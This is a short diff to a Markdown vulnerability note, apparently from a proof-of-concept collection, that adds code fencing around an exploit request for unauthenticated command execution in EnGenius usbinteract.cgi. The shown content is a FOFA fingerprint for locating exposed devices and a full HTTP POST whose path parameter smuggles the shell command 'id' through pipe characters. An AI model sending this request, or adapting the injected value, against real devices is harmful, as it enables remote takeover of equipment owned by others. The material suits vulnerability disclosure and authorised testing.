@@ -79,6 +79,7 @@ FOFA：body="/web/images/guest.png" && body="/web/images/admin.png"
 
 POC/EXP：
 
+```http
 POST /web/cgi-bin/usbinteract.cgi HTTP/1.1
 Host: 127.0.0.1
 Content-Type: application/x-www-form-urlencoded
@@ -87,6 +88,8 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 F
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 
 action=7&path="|id||"
+```
+
 
 ![image-20250307105624337](./.resource/EnGeniususbinteract.cgi存在未授权远程命令执行/media/image-20250307105624337.png)
 
